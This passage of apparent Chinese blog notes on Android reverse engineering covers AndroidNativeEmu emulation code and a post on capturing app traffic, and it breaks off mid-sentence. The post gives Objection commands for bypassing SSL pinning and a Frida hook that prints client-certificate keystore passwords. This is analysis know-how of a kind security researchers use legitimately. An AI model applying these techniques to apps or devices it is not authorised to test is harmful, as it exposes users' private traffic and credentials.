class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#实现打印字符串</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_method标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_class_def <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> debug_utils</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create java class.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/MainActivity&quot;</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;stringFromJNI&#x27;</span>, signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">True</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stringFromJNI</span>(<span class="params">self, uc,arg0</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>): <span class="comment">#一个参数</span></span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>): <span class="comment">#没有参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/unicorncourse07.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line">emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#两种调用方式，类比frida</span></span><br><span class="line">emulator.java_classloader.add_class(MainActivity)  <span class="comment">#模拟器注册  加载类</span></span><br><span class="line"><span class="comment">#JNIOnLoda中进行动态注册</span></span><br><span class="line">emulator.call_symbol(lib_module, <span class="string">&#x27;JNI_OnLoad&#x27;</span>, emulator.java_vm.address_ptr, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#利用动态注册地址调用Jni函数 方法一</span></span><br><span class="line">address=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> method <span class="keyword">in</span> MainActivity.jvm_methods.values():</span><br><span class="line">    <span class="keyword">if</span> method.name==<span class="string">&quot;stringFromJNI&quot;</span>:</span><br><span class="line">        address=method.native_addr  <span class="comment">#获取指定函数注册地址</span></span><br><span class="line">    logger.info(<span class="string">&quot;Registered JNI method--&gt;name:&quot;</span>+method.name+<span class="string">&quot;--signature:&quot;</span>+method.signature+<span class="string">&quot;--address&quot;</span>+method.native_addr)</span><br><span class="line">result=emulator.call_native(address,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#实例调用jni函数 方法二</span></span><br><span class="line"><span class="comment">#mainactivity=MainActivity()#创建实例</span></span><br><span class="line"><span class="comment">#result=mainactivity.stringFromJNI(emulator,&#x27;i am from python&#x27;) #调用实例下面的函数</span></span><br><span class="line"><span class="comment">#print(result)</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#jni函数中出现对java函数的调用</span></span><br></pre></td></tr></table></figure><p>AndroidNativeEmu模拟与java函数交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#实现打印字符串</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_method标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_class_def <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> debug_utils</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create java class.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/MainActivity&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;stringFromJNI&#x27;</span>,signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">True</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stringFromJNI</span>(<span class="params">self, uc,arg0</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#java函数 需要指定参数类型 args_list</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Encrypt</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/Encrypt&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;base64&#x27;</span>,  args_list=[<span class="string">&#x27;jstring&#x27;</span>],signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">False</span></span>) </span><span class="comment">#不是jni函数 native是false</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64</span>(<span class="params">self,*args, **kwargs</span>):  <span class="comment">#通过args打印参数</span></span><br><span class="line">        content=args[<span class="number">0</span>].value</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;base64 is called--&gt;&quot;</span>+content)</span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        encodestr=content.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        result=base64.b64encode(encodestr)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(result,<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#bytes --&gt; str</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>): <span class="comment">#一个参数</span></span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>): <span class="comment">#没有参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/calljava.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#两种调用方式，类比frida</span></span><br><span class="line">emulator.java_classloader.add_class(Encrypt)  <span class="comment">#模拟器注册  加载类</span></span><br><span class="line">emulator.java_classloader.add_class(MainActivity)  <span class="comment">#模拟器注册  加载类</span></span><br><span class="line">emulator.call_symbol(lib_module, <span class="string">&#x27;JNI_OnLoad&#x27;</span>, emulator.java_vm.address_ptr, <span class="number">0</span>) <span class="comment">#JNIOnLoda中进行动态注册</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用动态注册地址调用Jni函数 方法一</span></span><br><span class="line">address=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> method <span class="keyword">in</span> MainActivity.jvm_methods.values():</span><br><span class="line">    <span class="keyword">if</span> method.name==<span class="string">&quot;stringFromJNI&quot;</span>:</span><br><span class="line">        address=method.native_addr  <span class="comment">#获取注册地址</span></span><br><span class="line">    logger.info(<span class="string">&quot;Registered JNI method--&gt;name:&quot;</span>+method.name+<span class="string">&quot;--signature:&quot;</span>+method.signature+<span class="string">&quot;--address&quot;</span>+method.native_addr)</span><br><span class="line">result=emulator.call_native(address,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#实例调用jni函数 方法二</span></span><br><span class="line">mainactivity=MainActivity()<span class="comment">#创建实例</span></span><br><span class="line">result=mainactivity.stringFromJNI(emulator,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"> <span class="comment">#jni函数中出现对java函数的调用</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> Unidbg </tag>
            
            <tag> 模拟执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android抓包</title>
      <link href="/posts/be4930f3.html"/>
      <url>/posts/be4930f3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Android抓包"><a href="#Android抓包" class="headerlink" title="Android抓包"></a>Android抓包</h1><p>抓包工具：</p><ul><li>Packet Capture：无需root，基于本地VPN实现的抓包，可以支持TCP及以上层的消息捕获。</li></ul><p><a href="https://www.anquanke.com/post/id/197657#h3-10">实用FRIDA进阶：内存漫游、hook anywhere、抓包-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1967845">《安卓逆向这档事》第二十一课、抓包学得好，牢饭吃得饱(中) - 吾爱破解 - 52pojie.cn</a></p><h2 id="Http和Https"><a href="#Http和Https" class="headerlink" title="Http和Https"></a>Http和Https</h2><p><strong>Http</strong>：是一种应用层协议，用于传输超文本，如html文档，以及其他资源，如图像和视频。他是一种无状态的协议，这就意味着每个请求都是独立的，服务器不会保存有关客户端的任何信息。HTTP工作在TCP/IP协议栈的应用层，使用TCP端口80进行通信</p><p><strong>HTTPS</strong>：是http的安全版本，他通过SSL/TLS协议对http进行加密，SSL/TLS提供加密数据，身份验证，和数据完整性的保护，确保数据在传输过程中的安全。HTTPS使用443端通信，HTTPS并非一种新协议。只是http通信接口部分用SSL和TLS协议代替。</p><p><strong>HTTP方法</strong></p><p><img src="2025-01-15-Android抓包/image-20241019230748809.png" alt="image-20241019230748809"></p><p><strong>HTTP常见状态码</strong></p><p><img src="2025-01-15-Android抓包/image-20241019230826536.png" alt="image-20241019230826536"></p><h2 id="抓包介绍"><a href="#抓包介绍" class="headerlink" title="抓包介绍"></a>抓包介绍</h2><p>抓包一般分为两种情形：</p><p>应用层：Http(s)协议抓包</p><p>会话层：Socket端口通信抓包</p><ul><li>Hook抓包：通过对发包函数的Hook来达到抓包的目的</li><li>中间人抓包：将原来一段完整的客户端-服务端的通信方式割裂成两段客户端-服务端的通信，中间人抓包在OSI模型结构又分为 ===&gt; 应用层：Http(s)协议抓包   会话层：Socket通信抓包</li></ul><p>如果进行应用层协议抓包，可以使用Burpsuite或者Charles，不建议使用Fiddler，因为其无法导入客户端证书，在服务器校验客户端证书时无通过。如果是会话层抓包，则选择<code>tcpdump</code>和<code>WireShark</code>相组合的方式。</p><p>使用<code>jnettop</code>还可以实时查看流量走势和对方<code>IP</code>地址，更为直观和生动。</p><p>对于安卓应用来说，<code>Socket</code>通信天生又分为两种<code>Java</code>层<code>Socket</code>通信和<code>Native</code>层<code>Socket</code>通信。</p><ul><li><code>Java</code>层：使用的是<code>java.net.InetAddress</code>、<code>java.net.Socket</code>、<code>java.net.ServerSocket</code>等类，与证书绑定的情形类似，也可能存在着自定义框架的<code>Socket</code>通信，这时候就需要具体情况具体分析，比如谷歌的<code>protobuf</code>框架等；</li><li><code>Native</code>层：一般使用的是<code>C Socket API</code>，一般<code>hook</code>住<code>send()</code>和<code>recv()</code>函数可以得到其发送和接受的内容</li></ul><p><strong>Socket通信的一些关键函数</strong></p><p>Http：java.net.SocketOutputStream的socketWrite方法和java.net.SocketInputStream的read方法</p><p>Https:com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write([B,int,int)<br>和com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B,int, int)，</p><p>并且它们的第一个参数永远是明文的request或者response数据。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>保证主机和手机在一个局域网内，并且给手机进行代理设置，可以长按WLAN手动代理，代理服务器地址为主机的ip和端口。这样容易被下面的代码检测</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;http.proxyHost&quot;</span>)<span class="comment">;</span></span><br><span class="line">System.getProperty(<span class="string">&quot;http.proxyProt&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>所以最好采用VPN代理，采用工具Postern进行配置。注意目标地址设置为 ‘*’ 指定所有手机流量从代理经过</p><p>当对Charles进行http抓包时，需要关闭SSL模式(快捷键 ctrl+L)和Enable SOCKS proxy，且抓 https数据是乱码。</p><p>这里https配置不在赘述</p><h2 id="中间人抓包对抗"><a href="#中间人抓包对抗" class="headerlink" title="中间人抓包对抗"></a>中间人抓包对抗</h2><h3 id="SSL-pinning"><a href="#SSL-pinning" class="headerlink" title="SSL pinning"></a>SSL pinning</h3><p><img src="2025-01-15-Android抓包/3e7d68353ecaa9c62720955d1d230ea61665.png" alt="图片"></p><p><strong>SSL Pining</strong>：又称证书绑定，可以说是客户端校验服务器的进阶版，该方式不仅校验服务器证书是否是系统中的可信凭证，在通信过程中甚至连系统内置的证书都不信任而只信任app指定的证书。一旦发现服务器证书为非指定证书即立刻停止通信，最终导致即使将Charles证书安装到系统信任凭据中也无法生效。</p><p>服务器校验客户端：这种方式发生在https验证身份阶段，服务器在接收到客户端的公钥后，再发送session key之前先对客户端的公钥进行验证，如果不是信任证书的公钥，服务器就终止和客户端的通信。</p><p>由于ssl pining是在app代码内实现的所有可以通过hook来绕过。Objection本身可以完成SSL Pining Bypass的功能</p><p><code>android sslpinning disable</code></p><p>另外DroidSSLUnpining开源项目也可以进行绕过</p><p>在服务器校验客户端对抗手段中，在中间人的状态下与服务器通信的实际上是抓包工具，所有我们可以将app中内置的证书导入Charles中 让服务器认为自己扔在是与其信任的客户端进行通信，达到欺骗服务器的作用。</p><p>或者 <a href="https://github.com/deathmemory/FridaContainer">GitHub - deathmemory/FridaContainer: FridaContainer 整合了网上流行的和自己编写的常用的 frida 脚本，为逆向工作提效之用。 frida 脚本模块化，Java &amp; Jni Trace。</a></p><p><strong>ObjectionUnpinningPlus</strong></p><p><a href="https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js">https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js</a></p><p><a href="https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md">https://github.com/WooyunDota/DroidDrops/blob/master/2018/Frida.Android.Practice.md</a></p><ul><li>使用方法1 attach : frida -U com.example.mennomorsink.webviewtest2 —no-pause -l hooks.js</li><li>使用方法2 spawn : python application.py com.example.mennomorsink.webviewtest2</li></ul><h2 id="Hook模拟抓包"><a href="#Hook模拟抓包" class="headerlink" title="Hook模拟抓包"></a>Hook模拟抓包</h2><ul><li>打印内存中加载的类 <code>android hooking list classes</code></li><li>通过关键字HTTPURLConnect和okhttp(3)过滤类 <code>cat objection.log |grep -i</code> HTTPURLConnect或okhttp(3)  注意：这里objection.log是第一步输出类的日志</li><li>利用objection的-c参数 trace执行hook命令 ，先建一个文本.txt，里面内容是要执行的命令，类似于<code>android hooking watch class 类名</code>，txt文本建立后，使用<code>objection -g 包名 explore -c xxx.txt</code>即可</li><li>hook后点击app的登录看看有没有函数被调用，如果有进一步分析</li><li>这里选择一个hook到的函数hook他<code>android hooking watch class_method 函数名 --dump-args --dump-backtrace --dump-return</code> 重新登录一下app</li><li>发现数据包发送的函数为A，(通过hook他进一步验证猜想)</li></ul><p>一个能够完成混淆后的 okhttp的项目：okhttpLogger-Frida</p><p>okhttpLogger-Frida:通过反射区获取所有的类并利用okhttp3的一些框架特征去验证app中是否使用了okhttp3这个网络通信框架。</p><p>使用方法</p><ul><li>下载okhttpfind.dex，推到/data/local/tmp目录</li><li>启动app并使用命令将okhttp_poker.js注入app中<br><code>frida -U -l okhttp_poker.js</code> </li><li>注入后，按照提示输入find()命令以执行寻找okhttp框架的功能，如果找到相应的okhttp类便会将结果打印出来</li><li>将找到的结果复制到okhttp_poker.js覆盖掉原本okhttp_poker.js脚本中关于okhttp类的一些定义</li><li>然后重新注入这个okhttp_poker.js脚本。执行hold()命令，然后任意点击app的按钮，便会发现一些网络连接的内容。提示：如果想要能够保存，在输入脚本注入命令时候加上-o 保存文件的路径，这样将一次注入后的所有输出保存到文件中。</li></ul><h3 id="客户端验证服务端的姿势"><a href="#客户端验证服务端的姿势" class="headerlink" title="客户端验证服务端的姿势"></a>客户端验证服务端的姿势</h3><p><a href="https://bbs.kanxue.com/thread-283483.htm">[原创]Android app三种常见抓包场景及案例分析-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><ol><li>使用objection进行常规的抓包hook操作(见上)，或者使用 objection的 <code>android sslpinning disable</code></li><li>考虑到app在验证证书时一定会打开证书文件判断是否是app信任的框架，所以会使用File类的构造函数打开证书获得句柄。所以hook File类的构造函数<br><code>android hooking watch class_method java.io.File.$init --dump-args --dump-return</code><br>（在linux终端$需要使用转义字符，即File./$init）,hook后以/system/etc/security/cacerts这个系统存放证书的路径为关键字进行搜索<br>或者如下objection命令：<br><code>objection -N -h 127.0.0.1 -p 26666 -g cn.ticktick.task explore -P ~/.objection/plugins -s &quot;android hooking watch class_method java.io.File.\init --dump-args --dump-backtrace --dump-return</code></li></ol><h3 id="服务端验证客户端的姿势"><a href="#服务端验证客户端的姿势" class="headerlink" title="服务端验证客户端的姿势"></a>服务端验证客户端的姿势</h3><p>抓包出现<strong>“400 No required SSL certificate was sent”</strong>即出现服务端校验客户端。</p><p>抓包工具中导入app的证书</p><p>将apk解包，搜索证书<code>tree NCfhl |grep -i p12</code></p><p>系统加载证书文件的方式—使用keystore.load函数，第一个参数是证书输入流，第二个参数是密码。对着进行hook即可打印证书和其密码(代码实现具体见《抓包实战》书籍246页)。或者如下</p><p><img src="2025-01-15-Android抓包/image-20240704222928657.png" alt="image-20240704222928657"></p><p>或者使用如下脚本打印密码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_KeyStore_load</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;KeyStore.load1&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.InputStream&#x27;</span>, <span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1</span>) &#123;</span><br><span class="line">            <span class="title function_">printStack</span>(<span class="string">&quot;KeyStore.load2&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? <span class="title class_">StringClass</span>.$new(arg1) : <span class="literal">null</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0, arg1);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>或者使用r0capture</strong></p><p>对于使用r0capture的原理：</p><p>在安卓开发中，系统包是无法混淆的，例如java.security.KeyStore不会被混淆，所以可以hook这个类来获得证书，并且在java中，KeyStore$PrivateKeyEntry是存储在KeyStore中的，包含私钥和相关证书，即getPrivateKey() 和 getCertificateChain() 这两个方法，也就是说当应用程序调用getPrivateKey() 和 getCertificateChain() 